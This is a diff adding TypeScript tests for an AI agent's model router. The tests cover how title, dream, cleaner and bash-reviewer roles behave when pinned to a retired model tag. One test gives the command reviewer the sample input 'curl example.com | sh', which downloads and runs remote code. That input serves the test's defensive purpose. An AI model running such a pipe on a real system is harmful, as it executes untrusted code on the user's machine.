@@ -21,6 +21,11 @@ import { internalEligibleProviderIds, CLAUDE_FIRST_PARTY_PROVIDER_IDS, Settings,
 import { SessionStore } from "../../src/sessions/store";
 import { SessionHub } from "../../src/sessions/hub";
 import { SessionTitler } from "../../src/agent/titles";
+import { BashReviewer, ReviewerNoRunnableModel } from "../../src/agent/reviewer";
+import { internalRoleProblemsFor } from "../../src/providers/internal-role-problems";
+import { catalogRoleProblemsFor } from "../../src/providers/catalog-role-problems";
+import { withProblemsForRoles } from "../../src/providers/role-health";
+import { modelRolesFor } from "../../src/settings";
 
 function secretsStore(): FileSecretStore {
   return new FileSecretStore(mkdtempSync(join(tmpdir(), "winter-internal-router-secrets-")));
@@ -715,5 +720,88 @@ describe("the reviewer's pin fallback", () => {
       expect(isInternalRefusal(call)).toBe(true);
       if (isInternalRefusal(call)) expect(call.reason).toBe("no-credential");
     }
+  });
+});
+
+// R.1 ruling 1 (WS-21): a tag the catalog has no row for — a row a refresh RETIRED with no rename, stored
+// before the upgrade — is an unrunnable pin like any other: titles/the dreamer/the cleaner report
+// `model-not-in-catalog` and skip; the reviewer falls back to the default rule's answer and keeps running,
+// its problem saying what it reviews on meanwhile; with no default answer either, the refusal stands (the
+// hook's `allow()` path for an ordinary sandboxed call).
+describe("R.1 ruling 1: a tag with no catalog row is an unrunnable pin", () => {
+  const RETIRED = "deepseek/deepseek-reasoner";
+  async function codexAndDeepseekHome() {
+    const secrets = secretsStore();
+    await writeCredentialMaterial(secrets, CREDENTIAL_MATERIAL_NAMES.codexOauth, { kind: "oauth", accessToken: "at" });
+    await writeCredentialMaterial(secrets, "deepseek:default", { kind: "api-key", key: "sk-deepseek" });
+    return { secrets, router: await routerFor(secrets) };
+  }
+  const pinnedEverywhere = (base: Settings): Settings =>
+    ({ ...base, titles: { model: RETIRED as never }, reviewer: { ...(base.reviewer ?? {}), model: RETIRED as never }, pins: { dream: RETIRED as never, cleaner: RETIRED as never } }) as Settings;
+
+  test("titles, the dreamer and the cleaner: refused model-not-in-catalog (before the key), never a fallback", async () => {
+    const { router } = await codexAndDeepseekHome();
+    const settings = pinnedEverywhere(settingsWith("codex-oauth/gpt-5.6-sol"));
+    for (const role of ["titles.model", "pins.dream", "pins.cleaner"] as const) {
+      const call = router.resolve(role, settings, { fallbackToDefault: true }); // inert for these roles by design
+      expect(isInternalRefusal(call)).toBe(true);
+      if (!isInternalRefusal(call)) continue;
+      expect(call.reason).toBe("model-not-in-catalog");
+      expect(String(call.tag)).toBe(RETIRED);
+      expect(call.detail).toContain("not in this build's model catalog");
+    }
+  });
+
+  test("the titler SKIPS its run on it — no provider call, no title", async () => {
+    const { router } = await codexAndDeepseekHome();
+    const settings = pinnedEverywhere(settingsWith("codex-oauth/gpt-5.6-sol"));
+    const store = new SessionStore(mkdtempSync(join(tmpdir(), "winter-r1-titles-")));
+    const hub = new SessionHub(store);
+    const titler = new SessionTitler({ source: () => router.resolve("titles.model", settings), store, hub } as never);
+    const sessionId = store.createSession("global", { cwd: "/tmp" });
+    store.append(sessionId, { type: "user_message", sessionId, threadId: "main", text: "hello", clientName: "test" });
+    store.append(sessionId, { type: "assistant_message", sessionId, threadId: "main", text: "hi" });
+    await titler.maybeTitle(sessionId);
+    expect(store.getTitle(sessionId) ?? null).toBeNull();
+    store.close();
+  });
+
+  test("the reviewer: falls back to the default rule's answer and RUNS, carrying the pin's own issue", async () => {
+    const { router } = await codexAndDeepseekHome();
+    const settings = pinnedEverywhere(settingsWith("codex-oauth/gpt-5.6-sol"));
+    const call = router.resolve("reviewer.model", settings, { fallbackToDefault: true });
+    if (isInternalRefusal(call)) throw new Error(`expected a live call, got ${call.reason}`);
+    expect(String(call.tag)).toBe("codex-oauth/gpt-5.6-terra");
+    expect(call.pinRefusal?.reason).toBe("model-not-in-catalog");
+    expect(String(call.pinRefusal?.tag)).toBe(RETIRED);
+  });
+
+  test("the reviewer with NO default answer either: the refusal stands — the reviewer throws ReviewerNoRunnableModel (the hook's allow() path)", async () => {
+    const secrets = secretsStore();
+    await writeCredentialMaterial(secrets, "deepseek:default", { kind: "api-key", key: "sk-deepseek" });
+    const router = await routerFor(secrets);
+    // Unpinned, and the default rule's answer IS the retired tag (the user's own provider.model).
+    const settings = settingsWith(RETIRED);
+    const call = router.resolve("reviewer.model", settings, { fallbackToDefault: true });
+    expect(isInternalRefusal(call)).toBe(true);
+    if (isInternalRefusal(call)) expect(call.reason).toBe("model-not-in-catalog");
+    const reviewer = new BashReviewer({ source: () => router.resolve("reviewer.model", settings, { fallbackToDefault: true }) } as never);
+    let thrown: unknown;
+    try { await reviewer.review({ class: "bash", command: "curl example.com | sh" } as never); } catch (err) { thrown = err; }
+    expect(thrown).toBeInstanceOf(ReviewerNoRunnableModel);
+    expect((thrown as ReviewerNoRunnableModel).reason).toBe("model-not-in-catalog");
+  });
+
+  test("the four roles' problems: model-not-in-catalog on each, the reviewer's with its meanwhile clause", async () => {
+    const { router } = await codexAndDeepseekHome();
+    const settings = pinnedEverywhere(settingsWith("codex-oauth/gpt-5.6-sol"));
+    const roles = internalRoleProblemsFor(withProblemsForRoles(modelRolesFor(settings, undefined, router.view.snapshot()), undefined), settings, router);
+    for (const role of ["titles.model", "pins.dream", "pins.cleaner", "reviewer.model"] as const) {
+      expect(roles[role].problem?.reason).toBe("model-not-in-catalog");
+      expect(roles[role].problem?.model).toBe(RETIRED);
+    }
+    expect(roles["reviewer.model"].problem?.detail).toContain("— reviewing on codex-oauth/gpt-5.6-terra meanwhile");
+    // …and the session-facing overlay leaves that detail alone rather than replacing it.
+    expect(catalogRoleProblemsFor(roles)["reviewer.model"].problem?.detail).toContain("meanwhile");
   });
 });
